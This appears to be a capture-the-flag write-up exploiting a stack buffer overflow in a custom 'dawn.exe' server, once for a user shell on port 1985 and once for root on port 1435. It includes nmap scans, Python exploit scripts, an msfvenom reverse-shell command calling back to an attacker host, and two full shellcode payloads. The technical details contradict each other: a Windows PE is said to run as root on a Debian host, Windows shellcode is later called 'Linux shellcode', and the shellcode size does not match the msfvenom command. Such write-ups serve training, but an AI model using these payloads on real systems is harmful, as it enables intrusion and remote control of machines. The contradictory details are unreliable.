Dawn2: a classic stack buffer overflow, twice

A custom Windows server, leaked straight off its own web page, turns out to be vulnerable to a textbook stack-based buffer overflow. The target runs two separate instances of it, one for a user shell, a second running as root.

Room: Dawn2 Category: Binary Exploitation Tools: Immunity Debugger, mona, msfvenom, nmap

The setup: a web server hosting a download link to its own companion binary, plus two custom TCP services running on unusual ports. The job: reverse-engineer a crash into a working exploit, twice, once for a foothold and once for root.

Background, In Plain Terms

Stack buffer overflow

Sending more data into a fixed-size buffer than it can hold overwrites adjacent memory, including the saved return address (EIP) that controls where execution jumps next. Controlling that overwrite means controlling where the program goes next.

jmp esp

Shellcode gets placed on the stack, and ESP points at the stack. Redirecting EIP to any instruction that reads "jump to ESP" lands execution directly on the injected shellcode, without needing to guess its exact memory address.

Part One: User Shell (port 1985)

1
Enumerate the target and grab its own binary
nmap -sCV -v -T4 -p- <IP> --open

PORT     STATE SERVICE   VERSION
80/tcp   open  http      Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
1435/tcp open  ibm-cics?
1985/tcp open  hsrp?

Port 80's default page links directly to http://<target>/dawn.zip. Unzipped, it contains dawn.exe and a README that hands over the exact fuzzing requirement before any testing even starts:

DAWN Multi Server - Version 1.1

Important:

Due the lack of implementation of the Dawn client, many issues may be
experienced, such as the message not being delivered. In order to make
sure the connection is finished and the message well received, send a
NULL-byte at the ending of your message. Also, the service may crash
after several requests.
$ file dawn.exe
dawn.exe: PE32 executable (console) Intel 80386, for MS Windows
Why this works

A target that hands over its own binary, and a note about exactly how to terminate a message, is doing half the reconnaissance for you. The null-byte requirement turns out to be load-bearing for the exploit itself, not just the protocol.

2
Confirm the crash

With dawn.exe running under Immunity Debugger on a Windows VM, 500 bytes of A plus the required null byte:

#!/usr/bin/python3
import socket,os,sys
server = "10.0.2.40"
port = 1985

As = b'A'
nullbyte = b'\x00'
payload = As * 500 + nullbyte

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
    print("[+] payload sent.")

if __name__ == "__main__":
    main()

EIP gets overwritten with 41414141, the hex for 500 A's. Crash confirmed and controllable.

Why this works

EIP landing on a value that's recognizably "all A's" proves the overflow reaches exactly the saved return address, not some other part of the stack.

3
Find the exact offset

A unique, non-repeating pattern replaces the plain A's, so whatever ends up in EIP maps back to one exact byte position:

$ msf-pattern_create -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4...

Sending that pattern the same way as before, EIP comes back as 316A4130:

$ msf-pattern_offset -q 316a4130
[*] Exact match at offset 272
Why this works

A repeating pattern can't tell you where the crash happened, every chunk looks the same. A non-repeating pattern makes every 4-byte window unique, so the exact bytes in EIP map to exactly one position in the buffer.

4
Confirm control and check for room

272 A's, then four B's, then a null byte confirms EIP lands exactly on 42424242:

payload = As * 272 + (b'B' * 4) + nullbyte

Following that with 400 C's, the rough budget for a reverse-shell payload, confirms there's room in the buffer without corrupting anything:

payload = As * 272 + (b'B' * 4) + (b'C' * 400) + nullbyte
Why this works

Controlling EIP is necessary but not sufficient, the payload also has to physically fit. Confirming space before writing real shellcode avoids discovering a size problem after everything else already works.

5
Rule out bad characters

Every byte value from \x01 to \xff gets sent as the payload body, then compared byte-for-byte against what Immunity Debugger shows actually landed in memory (right-click ESP → Follow Dump):

badchars =b''
badchars+=b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
... (continues through \xff)

payload = As * 272 + (b'B' * 4) + badchars + nullbyte

Every value from \x01 through \xff lands intact and in order, no bad characters to exclude.

Why this works

Certain byte values (nulls, line feeds, carriage returns) get mangled by string-handling code before they reach the buffer. Shellcode generated without knowing which ones can silently break the moment it includes one.

6
Find a jump point and weaponize it

Mona's search finds a usable jmp esp instruction with no protections enabled:

!mona jmp -r esp

The output gives a viable pointer at 0x345964ba. With the offset, jump address, and a clean bad-character list, msfvenom generates the shellcode:

msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode

The final payload against the real target (272 A's, the jump address in little-endian, a 16-byte NOP sled, the shellcode, another NOP sled, then the null terminator):

server = "192.168.55.12"   #target server
port = 1985

shellcode =  b""
shellcode += b"\xb8\x0f\xe6\x73\xc6\xda\xc4\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e"
shellcode += b"\x03\x48\xe8\x91\x33\x67\x2f\xa2\x5f\xd4\x8c"
shellcode += b"\x1e\xca\xd8\x9b\x40\xba\xba\x56\x02\x28\x1b"
shellcode += b"\xd9\x3c\x82\x1b\x50\x3a\xe5\x73\xa3\x14\x24"
shellcode += b"\xb4\x4b\x67\x47\xab\xd7\xee\xa6\x7b\x81\xa0"
shellcode += b"\x79\x28\xfd\x42\xf3\x2f\xcc\xc5\x51\xc7\xa1"
shellcode += b"\xea\x26\x7f\x56\xda\xe7\x1d\xcf\xad\x1b\xb3"
shellcode += b"\x5c\x27\x3a\x83\x68\xfa\x3d"

As = b'A'
offset = 272
nullbyte = b'\x00'
nops = b'\x90' * 16
jmp_addr = b'\xba\x64\x59\x34'
payload = As * offset + jmp_addr + nops + shellcode + nops + nullbyte

Sent against the real Dawn target, this lands a reverse shell as a normal user.

Why this works

Every earlier step exists to pin down one variable this payload depends on: exactly how many bytes, which address to jump to, and which bytes to avoid. Skipping any of them turns this into blind guessing instead of a reliable exploit.

Part Two: Root, via a Second Instance (port 1435)

1
Find the second binary, running as root

A second executable, dawn-BETA.exe, sits on the target from the foothold shell. Same file family, confirmed the same way:

$ file dawn-BETA.exe
dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows

It listens on port 1435, the second port the original nmap scan already flagged, and runs with root privileges.

Why this works

Gaining a foothold is rarely the end of enumeration, it's a reason to look harder. The same vulnerable software class, redeployed with higher privileges, is exactly what a first shell makes visible that external scanning couldn't.

2
Repeat offset-finding against the new target

Same 500 A's against port 1435 confirms a crash, then the same unique pattern narrows it down. This time EIP comes back as 61413461, decoding to the ASCII sequence a4Aa:

$ msf-pattern_offset -q 61413461
[*] Exact match at offset 13

A much shorter buffer than the first binary, 13 bytes instead of 272.

Why this works

The same software, even a different build, tends to fail the same way, but not necessarily with the same numbers. Re-running the full methodology instead of assuming the old offset still applies is what catches the buffer-size difference.

3
Confirm bad chars and find the new jump point

The same badchar payload from Part One, re-sent against port 1435, comes back clean again, same exclusion list applies. A fresh mona search against this binary's own memory layout:

!mona jmp -r esp

finds a valid jmp esp address for the BETA binary specifically (a different address than the first binary, since it's a separate build in memory).

Why this works

A jump address is tied to a specific binary's memory layout, it has to be re-found for every build, even one that's otherwise identical code.

4
Reuse the Linux shellcode for root

Since this is the same target architecture and OS as before, the Linux reverse-shell shellcode from Part One's final exploit gets reused directly, just rebuilt around the new 13-byte offset and the BETA binary's own jump address:

#dawn-BETA.exe linux PG target
shellcode =  b""
shellcode += b"\xb8\x18\x31\x0c\x19\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x12\x31\x43\x12\x03\x43\x12"
shellcode += b"\x83\xf3\xcd\xee\xec\x32\xf5\x18\xed\x67\x4a"
shellcode += b"\xb4\x98\x85\xc5\xdb\xed\xef\x18\x9b\x9d\xb6"
shellcode += b"\x12\xa3\x6c\xc8\x1a\xa5\x97\xa0\x5c\xfd\x59"
shellcode += b"\x07\x35\xfc\x99\x76\x99\x89\x7b\xc8\x47\xda"
shellcode += b"\x2a\x7b\x3b\xd9\x45\x9a\xf6\x5e\x07\x34\x67"
shellcode += b"\x70\xdb\xac\x1f\xa1\x34\x4e\x89\x34\xa9\xdc"
shellcode += b"\x1a\xce\xcf\x50\x97\x1d\x8f"

Sent against port 1435 on the real target, this lands a reverse shell running as root.

Why this works

The exploit primitives (shellcode, NOP sled, null terminator) don't change between the two binaries, only the offset and the jump address do. Reusing what's already proven working minimizes the number of new variables introduced on the second pass.

Full Attack Chain

Web server: companion binary leaked via a download link (dawn.exe, port 1985)
  → File type confirmed: 32-bit Windows PE
       → Crash confirmed: 500 A's overwrite EIP with 41414141
            → Unique pattern: offset found at 272
                 → Space confirmed, bad chars ruled out clean
                      → jmp esp found via mona (0x345964ba)
                           → msfvenom shellcode: reverse shell as a normal user

Second binary found on the target (dawn-BETA.exe, port 1435, runs as root)
  → Same methodology: offset found at 13, same bad chars, new jmp esp
       → Linux shellcode reused: reverse shell as root

Takeaways

A crash is not an exploit until every variable is pinned down

Offset, bad characters, and a reliable jump address all have to be correct simultaneously. Skipping the bad-character check is the most common way a theoretically correct exploit fails in practice.

The same vulnerable code, redeployed, is still vulnerable

Finding one instance of a flawed custom service is a strong reason to look for others. A second copy running with higher privileges turned a user shell into root using the identical technique, just with its own offset and jump address.
